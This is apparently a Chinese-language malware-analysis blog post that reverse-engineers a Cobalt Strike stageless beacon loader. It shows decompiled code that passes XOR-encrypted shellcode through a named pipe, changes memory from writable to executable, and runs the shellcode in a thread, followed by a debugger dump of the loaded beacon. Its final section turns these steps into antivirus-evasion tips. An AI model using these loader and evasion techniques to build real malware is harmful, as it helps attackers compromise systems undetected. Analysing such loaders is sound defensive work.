#### stageless

快速翻找函数表后定位到主函数sub_403040如下

```
void __noreturn sub_403040()
{
  sub_401950();
  sub_4017F8(0i64);
  while ( 1 )
    Sleep(0x2710u);
}
```

进入到sub_4017F8函数中

```
__int64 sub_4017F8()
{
  DWORD dwCreationFlags; // [rsp+20h] [rbp-48h]
  int lpThreadId; // [rsp+28h] [rbp-40h]
  int v3; // [rsp+30h] [rbp-38h]
  int v4; // [rsp+38h] [rbp-30h]
  int v5; // [rsp+40h] [rbp-28h]
  int v6; // [rsp+48h] [rbp-20h]
  int v7; // [rsp+50h] [rbp-18h]
  DWORD v8; // [rsp+58h] [rbp-10h]

  v7 = 92;
  v6 = 101;
  v5 = 112;
  v4 = 105;
  v3 = 112;
  lpThreadId = 92;
  dwCreationFlags = 46;
  v8 = GetTickCount() % 0x26AA;
  sprintf(Buffer, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92i64, 92i64, dwCreationFlags, lpThreadId, v3, v4, v5, v6, v7, v8);
  CreateThread(0i64, 0i64, sub_4016E6, 0i64, 0, 0i64);
  return sub_4017A6(0i64);
}
```

创建了一个sub_4016E6函数的线程实例，进入sub_4016E6

```
__int64 __fastcall sub_4016E6(LPVOID lpThreadParameter)
{
  sub_401630(&dword_404020[5], dword_404020[1]);
  return 0i64;
}
```

进入到sub_401630

```
int __fastcall sub_401630(char *lpBuffer, signed int nNumberOfBytesToWrite)
{
  char *NamedPipeA; // r12
  int result; // eax
  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-2Ch] BYREF

  NumberOfBytesWritten = 0;
  NamedPipeA = (char *)CreateNamedPipeA(Buffer, 2u, 0, 1u, 0, 0, 0, 0i64);
  result = (_DWORD)NamedPipeA - 1;
  if ( (unsigned __int64)(NamedPipeA - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
  {
    result = ConnectNamedPipe(NamedPipeA, 0i64);
    if ( result )
    {
      while ( nNumberOfBytesToWrite > 0
           && WriteFile(NamedPipeA, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0i64) )
      {
        lpBuffer += NumberOfBytesWritten;
        nNumberOfBytesToWrite -= NumberOfBytesWritten;
      }
      return CloseHandle(NamedPipeA);
    }
  }
  return result;
}
```

将加密后的shellcode通过创建的管道读入到Buffer处

##### 核心功能

定位到sub_4017A6函数

```
__int64 sub_4017A6()
{
  void *v0; // r12

  v0 = malloc((int)dword_404020[1]);
  do
    Sleep(0x400u);
  while ( !(unsigned int)sub_401704(v0, dword_404020[1]) );
  sub_401595(v0, dword_404020[1], &dword_404020[2]);
  return 0i64;
}
```

`v0 = malloc((int)dword_404020[1])`类似于为shellcode动态分配一块内存空间

然后暂停0xx400ms（1s），调用sub_401704函数，v0即shellcode的地址，dword_404020[1]即shellcode的长度

```
__int64 __fastcall sub_401704(char *shellcode_addr, signed int shellcode_length)
{
  HANDLE FileA; // r12
  __int64 result; // rax
  DWORD NumberOfBytesRead; // [rsp+4Ch] [rbp-2Ch] BYREF

  NumberOfBytesRead = 0;
  FileA = CreateFileA(Buffer, 0x80000000, 3u, 0i64, 3u, 0x80u, 0i64);
  result = 0i64;
  if ( FileA != (HANDLE)-1i64 )
  {
    while ( shellcode_length > 0 && ReadFile(FileA, shellcode_addr, shellcode_length, &NumberOfBytesRead, 0i64) )
    {
      shellcode_addr += NumberOfBytesRead;
      shellcode_length -= NumberOfBytesRead;
    }
    CloseHandle(FileA);
    return 1i64;
  }
  return result;
}
```

通过while循环将Buffer处的加密的shellcode写入到shellcode_addr中，即v0中

最后调用sub_401595函数，`sub_401595((__int64)v0, dword_404020[1], (__int64)&dword_404020[2]);`

v0为加密的shellcode的地址，`dword_404020[1]`为shellcode长度，则是密钥

```
HANDLE __fastcall sub_401595(__int64 a1, int a2, __int64 a3)
{
  SIZE_T v3; // r12
  _BYTE *v6; // rbx
  __int64 i; // rax
  LPVOID v8; // rcx
  int flOldProtect[11]; // [rsp+3Ch] [rbp-2Ch] BYREF

  v3 = a2;
  v6 = VirtualAlloc(0i64, a2, 0x3000u, 4u);
  for ( i = 0i64; (int)v3 > (int)i; ++i )
    v6[i] = *(_BYTE *)(a1 + i) ^ *(_BYTE *)(a3 + (i & 3));
  sub_401563(v6);
  VirtualProtect(v8, v3, 0x20u, (PDWORD)flOldProtect);
  return CreateThread(0i64, 0i64, StartAddress, v6, 0, 0i64);
}
```

`VirtualAlloc(0i64, a2, 0x3000u, 4u)`：在合适的位置分配一块a2大小的内存块，拥有内存可读写权限

通过密钥对shellcode解密

```
for ( i = 0i64; (int)v3 > (int)i; ++i )
    v6[i] = *(_BYTE *)(a1 + i) ^ *(_BYTE *)(a3 + (i & 3));
```

`VirtualProtect(v8, v3, 0x20u, (PDWORD)flOldProtect)`：`VirtualProtect` 是 Windows API 函数，用于更改内存区域的保护属性，此代码功能为，将v6处的shellcode长度的内存空间改写为可读可执行，注：这里虽然是v8但是看了ida的汇编代码，发现反编译的时候出错了，实际上是v6

`CreateThread(0i64, 0i64, StartAddress, v6, 0, 0i64)`,创建线程实例执行v6处已解密的shellcode


之前没有启动cs服务端时，v6处的shellcode就为空，当我启动cs的服务端时，v6处填充了正常的shellcode，也正常上线了（内存中的一部分shellcode来自x64dbg）

```
0000000000A90000 | 4D:5A                    | pop r10                                 |
0000000000A90002 | 41:52                    | push r10                                |
0000000000A90004 | 55                       | push rbp                                |
0000000000A90005 | 48:89E5                  | mov rbp,rsp                             |
0000000000A90008 | 48:81EC 20000000         | sub rsp,20                              |
0000000000A9000F | 48:8D1D EAFFFFFF         | lea rbx,qword ptr ds:[A90000]           | rbx:"MZARUH夊H侅 ", 0000000000A90000:"MZARUH夊H侅 "
0000000000A90016 | 48:89DF                  | mov rdi,rbx                             | rbx:"MZARUH夊H侅 "
0000000000A90019 | 48:81C3 3C6E0100         | add rbx,16E3C                           | rbx:"MZARUH夊H侅 "
0000000000A90020 | FFD3                     | call rbx                                |
0000000000A90022 | 41:B8 F0B5A256           | mov r8d,56A2B5F0                        |
0000000000A90028 | 68 04000000              | push 4                                  |
0000000000A9002D | 5A                       | pop rdx                                 |
0000000000A9002E | 48:89F9                  | mov rcx,rdi                             | rcx:NtProtectVirtualMemory+14
0000000000A90031 | FFD0                     | call rax                                |
0000000000A90033 | 0000                     | add byte ptr ds:[rax],al                |
0000000000A90035 | 0000                     | add byte ptr ds:[rax],al                |
0000000000A90037 | 0000                     | add byte ptr ds:[rax],al                |
0000000000A90039 | 0000                     | add byte ptr ds:[rax],al                |
0000000000A9003B | 0008                     | add byte ptr ds:[rax],cl                |
0000000000A9003D | 0100                     | add dword ptr ds:[rax],eax              |
0000000000A9003F | 000E                     | add byte ptr ds:[rsi],cl                | rsi:L"t-ms-win-gdi-edgegdi-l1-1-0"
0000000000A90041 | 1F                       | ???                                     |
0000000000A90042 | BA 0E00B409              | mov edx,9B4000E                         |
0000000000A90047 | CD 21                    | int 21                                  |
0000000000A90049 | B8 014CCD21              | mov eax,21CD4C01                        |
0000000000A9004E | 54                       | push rsp                                |
0000000000A9004F | 68 69732070              | push 70207369                           |
0000000000A90054 | 72 6F                    | jb A900C5                               |
0000000000A90056 | 67:72 61                 | jb A900BA                               |
0000000000A90059 | 6D                       | insd                                    |
0000000000A9005A | 2063 61                  | and byte ptr ds:[rbx+61],ah             | rbx+61:" be run in DOS mode.\r\r\n$"
0000000000A9005D | 6E                       | outsb                                   |
0000000000A9005E | 6E                       | outsb                                   |
0000000000A9005F | 6F                       | outsd                                   |
```

##### 启发

我们做免杀的时候，可以学习这个魔改版cs的免杀

1. 将初始的payload编码，运行时解密，这样绕过了静态查杀
2. 将实际要执行的代码先设为可写可读，等到运行时再设置为可读可执行
